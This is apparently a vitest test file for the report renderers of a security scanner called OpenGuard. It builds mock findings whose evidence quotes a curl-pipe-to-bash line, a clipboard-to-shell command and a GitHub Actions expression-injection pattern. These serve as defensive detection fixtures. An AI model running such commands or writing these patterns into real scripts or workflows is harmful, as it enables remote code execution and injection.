import { describe, expect, it } from "vitest";
import { buildJsonReport } from "../../src/report/json-reporter.js";
import { renderMarkdownReport } from "../../src/report/markdown-reporter.js";
import { renderSarifReport } from "../../src/report/sarif-reporter.js";
import { renderPrComment } from "../../src/report/pr-comment-renderer.js";
import { Confidence, Severity } from "../../src/scanner/types.js";
import type { Finding } from "../../src/scanner/types.js";
import type { ReportInput } from "../../src/report/types.js";

const finding: Finding = {
  id: "abc123def456",
  rule_id: "OG-SHELL-001",
  severity: Severity.Critical,
  category: "shell",
  confidence: Confidence.High,
  title: "Curl pipe",
  description: "Test",
  remediation: "Test",
  evidence: {
    path: "install.sh",
    start_line: 3,
    end_line: 3,
    snippet: "curl https://example.com | bash",
    match: "curl https://example.com | bash",
  },
};

const markdownFinding: Finding = {
  id: "md123def456",
  rule_id: "OG-MD-001",
  severity: Severity.High,
  category: "shell",
  confidence: Confidence.Medium,
  title: "Clipboard to shell execution",
  description: "Test",
  remediation: "Test",
  evidence: {
    path: "README.md",
    start_line: 5,
    end_line: 5,
    snippet: "pbpaste | bash",
    match: "pbpaste | bash",
  },
};

const highSignalFinding: Finding = {
  id: "gha123def456",
  rule_id: "OG-GHA-004",
  severity: Severity.High,
  category: "gha",
  confidence: Confidence.High,
  title: "Script injection via expressions",
  description: "Test",
  remediation: "Test",
  evidence: {
    path: ".github/workflows/ci.yml",
    start_line: 10,
    end_line: 10,
    snippet: "run: echo ${{ github.event.issue.title }}",
    match: "${{ github.event.issue.title }}",
  },
};

const reportInput: ReportInput = {
  toolVersion: "0.1.0",
  target: { input: "./demo", resolved_path: "/tmp/demo", files_scanned: 1 },
  findings: [finding],
  subscores: { shell: 80, network: 0, filesystem: 0, credentials: 0 },
  totalScore: 80,
};

describe("report", () => {
  it("builds json report", () => {
    const report = buildJsonReport(reportInput);
    expect(report.tool.name).toBe("openguard");
    expect(report.summary.total_score).toBe(80);
    expect(report.summary.risk_level).toBe("critical");
    expect(report.findings).toHaveLength(1);
  });

  it("renders markdown report", () => {
    const report = buildJsonReport(reportInput);
    const md = renderMarkdownReport(report);
    expect(md).toContain("OpenGuard Scan Report");
    expect(md).toContain("Findings");
    expect(md).toContain("OG-SHELL-001");
  });

  it("renders social engineering summary when markdown signals exist", () => {
    const report = buildJsonReport({
      ...reportInput,
      findings: [markdownFinding, highSignalFinding],
      subscores: { shell: 15, network: 0, filesystem: 0, credentials: 0 },
      totalScore: 15,
    });
    const md = renderMarkdownReport(report);
    const comment = renderPrComment({ head: report });
    expect(md).toContain("Social Engineering Signals");
    expect(comment).toContain("Social Engineering Signals");
    expect(comment).toContain("New High-Signal Rules");
    expect(comment).toContain("OG-GHA-004");
  });

  it("renders pr comment with delta", () => {
    const report = buildJsonReport(reportInput);
    const comment = renderPrComment({ head: report });
    expect(comment).toContain("openguard-pr-comment");
    expect(comment).toContain("Risk Score");
    expect(comment).toContain("New Findings");
  });

  it("renders sarif report", () => {
    const report = buildJsonReport(reportInput);
    const sarif = JSON.parse(renderSarifReport(report)) as {
      version: string;
      runs: Array<{ tool: { driver: { name: string } }; results: unknown[] }>;
    };
    expect(sarif.version).toBe("2.1.0");
    expect(sarif.runs[0]?.tool.driver.name).toBe("OpenGuard");
    expect(sarif.runs[0]?.results.length).toBe(1);
  });
});
